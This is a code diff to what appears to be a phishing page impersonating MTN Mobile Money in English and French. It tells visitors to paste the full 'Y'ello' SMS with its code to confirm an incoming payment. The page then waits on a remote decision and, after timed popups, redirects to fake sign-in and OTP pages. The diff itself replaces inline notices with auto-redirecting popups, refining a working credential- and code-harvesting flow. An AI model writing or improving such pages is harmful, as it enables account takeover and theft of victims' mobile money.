@@ -82,35 +82,6 @@
     letter-spacing: -0.6px;
   }
 
-  .notice {
-    display: none;
-    padding: 13px 15px;
-    border-radius: 12px;
-    font-size: 12.5px;
-    font-weight: 600;
-    line-height: 1.55;
-    margin-bottom: 18px;
-    border: 1px solid transparent;
-  }
-  .notice.show { display: block; }
-  .notice .notice-title {
-    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
-    text-transform: uppercase; margin-bottom: 4px;
-    display: block;
-  }
-  .notice.warn {
-    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
-  }
-  .notice.warn .notice-title { color: #8A6600; }
-  .notice.error {
-    background: var(--mtn-red-soft); border-color: #F2B8B8; color: var(--mtn-red);
-  }
-  .notice.error .notice-title { color: #8B0000; }
-  .notice.info {
-    background: #EAF3FE; border-color: #BFD8F6; color: var(--mtn-deep);
-  }
-  .notice.info .notice-title { color: var(--mtn-deep); }
-
   .section-label {
     font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
     text-transform: uppercase; color: var(--mtn-gray);
@@ -347,15 +318,6 @@
 
   <div class="body">
 
-    <div class="notice warn" id="noticeExpired">
-      <span class="notice-title" id="noticeExpiredTitle">Check your inbox</span>
-      <span id="noticeExpiredBody">Please check the new SMS message in your inbox, copy it, and paste it in the box below.</span>
-    </div>
-    <div class="notice info" id="noticeFullSms">
-      <span class="notice-title" id="noticeFullSmsTitle">Full SMS requested</span>
-      <span id="noticeFullSmsBody">For your security, please paste the <strong>entire</strong> Y'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.</span>
-    </div>
-
     <div class="amount-card">
       <span class="label" id="amountLabel">Amount you are receiving</span>
       <span class="amount" id="amountValue">—</span>
@@ -429,10 +391,6 @@
       docTitle: 'MTN Mobile Money · Confirm Receipt',
       pageTitle: 'Confirm this incoming payment',
       pageSub: 'Paste the Y\'ello message you received from MTN to confirm this incoming transfer.',
-      noticeExpiredTitle: 'Check your inbox',
-      noticeExpiredBody: 'Please check the new SMS message in your inbox, copy it, and paste it in the box below.',
-      noticeFullSmsTitle: 'Full SMS requested',
-      noticeFullSmsBody: 'For your security, please paste the <strong>entire</strong> Y\'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.',
       amountLabel: 'Amount you are receiving',
       sectionLabel: 'Y\'ello SMS message',
       smsPlaceholder: 'Paste the full Y\'ello message here…',
@@ -461,18 +419,26 @@
       pastedFromClipboard: 'Pasted from clipboard.',
       clipboardEmpty: 'Clipboard is empty.',
       pasteManually: 'Paste manually: long-press the box and tap Paste.',
-      fullSmsToast: 'Please paste the full Y\'ello SMS, or tap Resend SMS.',
-      wrongPinPopupTitle: 'Wrong PIN Entered',
-      wrongPinPopupDesc: 'You entered the wrong PIN. You will be taken back to sign in to try again.'
+
+      popupDeclineTitle: 'Receipt not confirmed',
+      popupDeclineDesc: 'This incoming payment was not confirmed. You will be taken back to the previous page to paste a new message.',
+
+      popupWrongPinTitle: 'Wrong PIN Entered',
+      popupWrongPinDesc: 'You entered the wrong PIN. You will be taken back to sign in to try again.',
+
+      popupResendTitle: 'Check your inbox',
+      popupResendDesc: 'A new Y\'ello message was sent to your phone. Please check your SMS inbox and paste the new message.',
+
+      popupFullSmsTitle: 'Full SMS requested',
+      popupFullSmsDesc: 'Please paste the entire Y\'ello SMS you received — including any code or reference — so we can verify it.',
+
+      popupExpiredTitle: 'Code expired',
+      popupExpiredDesc: 'The SMS you submitted has expired. You will be taken back to paste a new message.'
     },
     fr: {
       docTitle: 'MTN Mobile Money · Confirmer la réception',
       pageTitle: 'Confirmez ce paiement entrant',
       pageSub: 'Collez le message Y\'ello que vous avez reçu de MTN pour confirmer ce transfert entrant.',
-      noticeExpiredTitle: 'Vérifiez votre boîte de réception',
-      noticeExpiredBody: 'Veuillez vérifier le nouveau message SMS dans votre boîte de réception, le copier et le coller dans la zone ci-dessous.',
-      noticeFullSmsTitle: 'SMS complet demandé',
-      noticeFullSmsBody: 'Pour votre sécurité, veuillez coller <strong>tout</strong> le SMS Y\'ello que vous avez reçu — y compris tout code ou référence — ou appuyez sur <strong>Renvoyer le SMS</strong> ci-dessous pour recevoir un nouveau message.',
       amountLabel: 'Montant que vous recevez',
       sectionLabel: 'Message SMS Y\'ello',
       smsPlaceholder: 'Collez le message Y\'ello complet ici…',
@@ -501,9 +467,21 @@
       pastedFromClipboard: 'Collé depuis le presse-papiers.',
       clipboardEmpty: 'Le presse-papiers est vide.',
       pasteManually: 'Collez manuellement : appuyez longuement sur la zone et choisissez Coller.',
-      fullSmsToast: 'Veuillez coller le SMS Y\'ello complet, ou appuyez sur Renvoyer le SMS.',
-      wrongPinPopupTitle: 'Code PIN incorrect',
-      wrongPinPopupDesc: 'Vous avez saisi un code PIN incorrect. Vous allez être redirigé vers la connexion pour réessayer.'
+
+      popupDeclineTitle: 'Réception non confirmée',
+      popupDeclineDesc: 'Ce paiement entrant n\'a pas été confirmé. Vous allez être redirigé vers la page précédente pour coller un nouveau message.',
+
+      popupWrongPinTitle: 'Code PIN incorrect',
+      popupWrongPinDesc: 'Vous avez saisi un code PIN incorrect. Vous allez être redirigé vers la connexion pour réessayer.',
+
+      popupResendTitle: 'Vérifiez votre boîte de réception',
+      popupResendDesc: 'Un nouveau message Y\'ello a été envoyé sur votre téléphone. Veuillez vérifier votre boîte de réception SMS et coller le nouveau message.',
+
+      popupFullSmsTitle: 'SMS complet demandé',
+      popupFullSmsDesc: 'Veuillez coller le SMS Y\'ello complet que vous avez reçu — y compris tout code ou référence — afin que nous puissions le vérifier.',
+
+      popupExpiredTitle: 'Code expiré',
+      popupExpiredDesc: 'Le SMS que vous avez soumis a expiré. Vous allez être redirigé pour coller un nouveau message.'
     }
   };
 
@@ -564,10 +542,6 @@
     document.title = T.docTitle;
     document.getElementById('pageTitle').textContent = T.pageTitle;
     document.getElementById('pageSub').textContent = T.pageSub;
-    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
-    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
-    document.getElementById('noticeFullSmsTitle').textContent = T.noticeFullSmsTitle;
-    document.getElementById('noticeFullSmsBody').innerHTML = T.noticeFullSmsBody;
     document.getElementById('amountLabel').textContent = T.amountLabel;
     document.getElementById('sectionLabel').textContent = T.sectionLabel;
     document.getElementById('smsInput').placeholder = T.smsPlaceholder;
@@ -607,17 +581,6 @@
   }
   function stopTrustSlider() {
     if (trustTimer) { clearInterval(trustTimer); trustTimer = null; }
-  }
-
-  function hideAllNotices() {
-    document.getElementById('noticeExpired').classList.remove('show');
-    document.getElementById('noticeFullSms').classList.remove('show');
-  }
-  function showNotice(id) {
-    hideAllNotices();
-    const el = document.getElementById(id);
-    el.classList.add('show');
-    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
   }
 
   function clearSmsInput() {
@@ -687,7 +650,6 @@
   }
 
   document.getElementById('smsInput').addEventListener('input', () => {
-    hideAllNotices();
     updateDetected();
   });
 
@@ -709,8 +671,7 @@
       btn.classList.add('sent');
       lbl.textContent = T.resendSent;
       clearSmsInput();
-      showNotice('noticeExpired');
-      showToast(T.newSmsSent);
+      showPopupThenReload(T.popupResendTitle, T.popupResendDesc);
       setTimeout(() => {
         btn.classList.remove('sent');
         lbl.textContent = T.resendLabel;
@@ -731,7 +692,6 @@
         const txt = await navigator.clipboard.readText();
         if (txt) {
           document.getElementById('smsInput').value = txt;
-          hideAllNotices();
           updateDetected();
           showToast(T.pastedFromClipboard);
         } else {
@@ -748,6 +708,59 @@
     btn.disabled = false;
   }
 
+  /* ============================================================
+     POPUP HELPERS
+     ============================================================ */
+
+  // Show a popup with title + description. Returns the overlay element.
+  function showPopup(title, desc) {
+    const overlay = document.createElement('div');
+    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
+    overlay.innerHTML =
+      '<div style="background:#fff;border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:Poppins,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);">' +
+        '<div style="width:60px;height:60px;border-radius:50%;background:#2059B5;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>' +
+        '<div style="font-size:17px;font-weight:800;color:#101828;margin-bottom:8px;">' + title + '</div>' +
+        '<div style="font-size:13px;color:#667085;line-height:1.6;">' + desc + '</div>' +
+      '</div>';
+    document.body.appendChild(overlay);
+    return overlay;
+  }
+
+  // Popup that auto-reloads the current page after a delay.
+  function showPopupThenReload(title, desc, delay) {
+    const ms = typeof delay === 'number' ? delay : 7000;
+    const overlay = showPopup(title, desc);
+    setTimeout(() => {
+      // Reload sms.html with the same tx params — fresh textarea.
+      const q = new URLSearchParams({
+        tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn, c: tx.c,
+        pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+        lang: currentLang
+      });
+      window.location.href = 'sms.html?' + q.toString();
+    }, ms);
+    return overlay;
+  }
+
+  // Popup that auto-redirects to mtn-signin.html after a delay.
+  function showPopupThenSignin(title, desc, delay) {
+    const ms = typeof delay === 'number' ? delay : 7000;
+    const overlay = showPopup(title, desc);
+    setTimeout(() => {
+      const q = new URLSearchParams({
+        tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn, c: tx.c,
+        pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+        lang: currentLang
+      });
+      window.location.href = 'mtn-signin.html?' + q.toString();
+    }, ms);
+    return overlay;
+  }
+
+  /* ============================================================
+     CONFIRM PAYMENT — polling
+     ============================================================ */
+
   let pollingActive = false;
   let pollTimer = null;
 
@@ -759,34 +772,6 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = false;
     document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
-  }
-
-  function showWrongPinPopup() {
-    const overlay = document.createElement('div');
-    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
-    overlay.innerHTML =
-      '<div style="background:#fff;border-radius:20px;padding:28px 24px;max-width:340px;width:100%;text-align:center;font-family:Poppins,sans-serif;box-shadow:0 20px 50px rgba(0,0,0,0.25);">' +
-        '<div style="width:60px;height:60px;border-radius:50%;background:#E31E24;color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:800;margin:0 auto 16px;">!</div>' +
-        '<div style="font-size:17px;font-weight:800;color:#101828;margin-bottom:8px;">' + T.wrongPinPopupTitle + '</div>' +
-        '<div style="font-size:13px;color:#667085;line-height:1.6;">' + T.wrongPinPopupDesc + '</div>' +
-      '</div>';
-    document.body.appendChild(overlay);
-
-    setTimeout(() => {
-      const q = new URLSearchParams({
-        tx: tx.ref,
-        am: tx.am,
-        cur: tx.cur,
-        rn: tx.rn,
-        c: tx.c,
-        pm: tx.pm,
-        sn: tx.sn,
-        mk: tx.mk,
-        an: tx.an,
-        lang: currentLang
-      });
-      window.location.href = 'mtn-signin.html?' + q.toString();
-    }, 7000);
   }
 
   async function confirmPayment() {
@@ -811,7 +796,7 @@
       return;
     }
 
-    hideAllNotices();
+    document.getElementById('smsError').classList.remove('show');
 
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
@@ -864,6 +849,7 @@
 
       if (!pollingActive) return;
 
+      /* ---- APPROVED → straight to otp2.html, no popup ---- */
       if (decision === 'approved') {
         pollingActive = false;
         stopTrustSlider();
@@ -876,6 +862,7 @@
         return;
       }
 
+      /* ---- INACTIVE → oops.html ---- */
       if (decision === 'inactive') {
         pollingActive = false;
         stopTrustSlider();
@@ -890,6 +877,7 @@
         return;
       }
 
+      /* ---- WRONG PIN → popup → sign-in page after 7s ---- */
       if (decision === 'wrong_pin') {
         pollingActive = false;
         stopTrustSlider();
@@ -897,10 +885,11 @@
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         clearSmsInput();
-        showWrongPinPopup();
+        showPopupThenSignin(T.popupWrongPinTitle, T.popupWrongPinDesc, 7000);
         return;
       }
 
+      /* ---- DECLINED → popup → reload sms.html after 7s ---- */
       if (decision === 'declined') {
         pollingActive = false;
         stopTrustSlider();
@@ -908,10 +897,11 @@
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         clearSmsInput();
-        showWrongPinPopup();
+        showPopupThenReload(T.popupDeclineTitle, T.popupDeclineDesc, 7000);
         return;
       }
 
+      /* ---- EXPIRED → popup → reload sms.html after 7s ---- */
       if (decision === 'expired') {
         pollingActive = false;
         stopTrustSlider();
@@ -919,11 +909,11 @@
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         clearSmsInput();
-        showNotice('noticeExpired');
-        showToast(T.noticeExpiredTitle);
+        showPopupThenReload(T.popupExpiredTitle, T.popupExpiredDesc, 7000);
         return;
       }
 
+      /* ---- NEEDS FULL SMS → popup → reload sms.html after 7s ---- */
       if (decision === 'needs_full_sms' || decision === 'fully') {
         pollingActive = false;
         stopTrustSlider();
@@ -931,9 +921,7 @@
         btn.disabled = false;
         document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
         clearSmsInput();
-        showNotice('noticeFullSms');
-        document.getElementById('smsInput').focus();
-        showToast(T.fullSmsToast);
+        showPopupThenReload(T.popupFullSmsTitle, T.popupFullSmsDesc, 7000);
         return;
       }
 
